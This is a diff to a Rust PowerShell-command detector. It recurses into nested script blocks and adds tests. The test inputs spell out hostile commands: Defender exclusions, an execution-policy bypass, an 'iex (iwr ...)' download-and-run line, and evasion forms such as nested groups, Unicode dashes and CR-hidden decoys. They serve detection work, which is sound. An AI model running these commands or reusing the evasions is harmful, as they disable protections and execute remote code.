@@ -23,22 +23,38 @@
 //! — the gate lives in `engine.rs`.
 
 use crate::redact;
-use crate::rules::command::{normalize_cmd_base, normalize_shell_token};
+use crate::rules::command::{
+    normalize_cmd_base, normalize_powershell_parameter_token, normalize_shell_token,
+};
 use crate::tokenize::{self, ShellType};
 use crate::verdict::{Evidence, Finding, RuleId, Severity};
 
-/// Run PowerShell-specific detection rules against `input`. Caller must ensure
-/// `shell == ShellType::PowerShell` (gated in `engine.rs`). Tier-1 patterns are
+/// Run PowerShell-specific detection rules against `input` and any statically
+/// recovered child body whose effective shell is PowerShell. Tier-1 patterns are
 /// still required so the fast gate doesn't filter the input out first — the
 /// `build.rs` PATTERN_TABLE entries are `ps_set_execution_policy`,
 /// `ps_defender_exclusion`, `ps_iex_inline`.
 pub fn check(input: &str, shell: ShellType) -> Vec<Finding> {
-    let mut findings = Vec::new();
-    let segments = tokenize::tokenize(input, shell);
+    check_depth(input, shell, 0)
+}
 
-    check_set_execution_policy(&segments, shell, &mut findings);
-    check_defender_exclusion(&segments, shell, &mut findings);
-    check_inline_download_execute(&segments, shell, &mut findings);
+const MAX_POWERSHELL_GROUP_DEPTH: usize = 8;
+
+fn check_depth(input: &str, shell: ShellType, depth: usize) -> Vec<Finding> {
+    let mut findings = Vec::new();
+    if shell == ShellType::PowerShell {
+        let segments = tokenize::tokenize(input, shell);
+        check_set_execution_policy(&segments, shell, &mut findings);
+        check_defender_exclusion(&segments, shell, &mut findings);
+        check_inline_download_execute(&segments, shell, &mut findings);
+    }
+
+    let nested = crate::extract::executable_substitution_scan(input, shell).bodies;
+    if depth < MAX_POWERSHELL_GROUP_DEPTH {
+        for body in nested {
+            findings.extend(check_depth(&body.input, body.shell, depth + 1));
+        }
+    }
 
     findings
 }
@@ -149,7 +165,7 @@ fn check_set_execution_policy(
 /// prefix PowerShell accepts for `-ExecutionPolicy`.
 fn has_execution_policy_bypass_flag(args: &[String], shell: ShellType) -> bool {
     for (i, arg) in args.iter().enumerate() {
-        let n = normalize_shell_token(arg.trim(), shell);
+        let n = normalize_powershell_parameter_token(arg.trim(), shell);
         let lower = n.to_ascii_lowercase();
         let (name, joined_value) = split_powershell_parameter(&lower);
         if !is_execution_policy_parameter(name) {
@@ -205,7 +221,7 @@ fn check_defender_exclusion(
         }
 
         let mentions_exclusion = args.iter().any(|a| {
-            let n = normalize_shell_token(a.trim(), shell).to_ascii_lowercase();
+            let n = normalize_powershell_parameter_token(a.trim(), shell).to_ascii_lowercase();
             let (name, _) = split_powershell_parameter(&n);
             is_unique_defender_exclusion_parameter(name)
         });
@@ -316,4 +332,128 @@ fn check_inline_download_execute(
 /// fresh commands that rule does NOT cover, so this one must still run on them.
 fn is_pipe_separator(sep: &str) -> bool {
     sep == "|" || sep == "|&"
+}
+
+#[cfg(test)]
+mod tests {
+    use super::*;
+
+    fn has(input: &str, rule: RuleId) -> bool {
+        check(input, ShellType::PowerShell)
+            .iter()
+            .any(|finding| finding.rule_id == rule)
+    }
+
+    #[test]
+    fn invoked_groups_reach_every_powershell_rule_family() {
+        assert!(has(
+            "& { Add-MpPreference -ExclusionPath C:\\Temp }",
+            RuleId::PsDefenderExclusion,
+        ));
+        assert!(has(
+            ". { Set-ExecutionPolicy Bypass }",
+            RuleId::PsSetExecutionPolicyBypass,
+        ));
+        assert!(has(
+            "& { iex (iwr https://example.test/install.ps1) }",
+            RuleId::PsInlineDownloadExecute,
+        ));
+        assert!(has(
+            "& ({ Add-MpPreference -ExclusionProcess malware.exe })",
+            RuleId::PsDefenderExclusion,
+        ));
+    }
+
+    #[test]
+    fn nested_invocation_groups_and_subexpressions_are_bounded_but_visible() {
+        assert!(has(
+            "& { Write-Output $(& { Add-MpPreference -ExclusionPath C:\\Temp }) }",
+            RuleId::PsDefenderExclusion,
+        ));
+
+        let within_budget = format!(
+            "{}Add-MpPreference -ExclusionPath C:\\Temp{}",
+            "& { ".repeat(MAX_POWERSHELL_GROUP_DEPTH),
+            " }".repeat(MAX_POWERSHELL_GROUP_DEPTH),
+        );
+        assert!(has(&within_budget, RuleId::PsDefenderExclusion));
+    }
+
+    #[test]
+    fn executable_scriptblock_arguments_reach_powershell_rules() {
+        for input in [
+            "1 | ForEach-Object { Add-MpPreference -ExclusionPath C:\\Temp }",
+            "Invoke-Command -ScriptBlock { Add-MpPreference -ExclusionPath C:\\Temp }",
+            "Start-Job { Add-MpPreference -ExclusionPath C:\\Temp }",
+            "Measure-Command { Add-MpPreference -ExclusionPath C:\\Temp }",
+            "if ($true) { Add-MpPreference -ExclusionPath C:\\Temp }",
+            "try { Add-MpPreference -ExclusionPath C:\\Temp } finally { Write-Output done }",
+            "{ Add-MpPreference -ExclusionPath C:\\Temp }.Invoke()",
+            "({ Add-MpPreference -ExclusionPath C:\\Temp }).InvokeReturnAsIs()",
+        ] {
+            assert!(has(input, RuleId::PsDefenderExclusion), "{input}");
+        }
+    }
+
+    #[test]
+    fn invoked_local_functions_and_switch_actions_reach_powershell_rules() {
+        for input in [
+            "function Evil { Add-MpPreference -ExclusionPath C:\\Temp }; Evil",
+            "filter Evil { Add-MpPreference -ExclusionPath C:\\Temp }; Evil",
+            "switch (1) { 1 { Add-MpPreference -ExclusionPath C:\\Temp } }",
+        ] {
+            assert!(has(input, RuleId::PsDefenderExclusion), "{input}");
+        }
+    }
+
+    #[test]
+    fn cross_shell_powershell_wrapper_reaches_powershell_rules() {
+        assert!(check(
+            "pwsh -Command 'Add-MpPreference -ExclusionPath C:\\Temp'",
+            ShellType::Posix,
+        )
+        .iter()
+        .any(|finding| finding.rule_id == RuleId::PsDefenderExclusion));
+    }
+
+    #[test]
+    fn unicode_parameter_dashes_reach_powershell_rule_binders() {
+        for dash in ['\u{2013}', '\u{2014}', '\u{2015}'] {
+            let defender = format!("Add-MpPreference {dash}ExclusionPath C:\\Temp");
+            assert!(
+                has(&defender, RuleId::PsDefenderExclusion),
+                "Defender parameter dash was missed: {defender:?}"
+            );
+
+            let policy = format!("pwsh {dash}ExecutionPolicy:Bypass");
+            assert!(
+                has(&policy, RuleId::PsSetExecutionPolicyBypass),
+                "execution-policy parameter dash was missed: {policy:?}"
+            );
+        }
+    }
+
+    #[test]
+    fn cr_only_comment_and_stop_parsing_boundaries_reach_real_suffixes() {
+        for input in [
+            "Write-Output safe # Add-MpPreference decoy\rAdd-MpPreference -ExclusionPath C:\\Temp",
+            "native.exe --% literal # data } ; decoy\rAdd-MpPreference -ExclusionPath C:\\Temp",
+        ] {
+            assert!(has(input, RuleId::PsDefenderExclusion), "{input:?}");
+        }
+    }
+
+    #[test]
+    fn dormant_and_quoted_scriptblocks_do_not_execute() {
+        for input in [
+            "$block = { Add-MpPreference -ExclusionPath C:\\Temp }",
+            "Write-Output '{ Add-MpPreference -ExclusionPath C:\\Temp }'",
+            "& { Write-Output safe; Get-Date }",
+        ] {
+            assert!(
+                check(input, ShellType::PowerShell).is_empty(),
+                "benign/dormant scriptblock fired: {input}"
+            );
+        }
+    }
 }
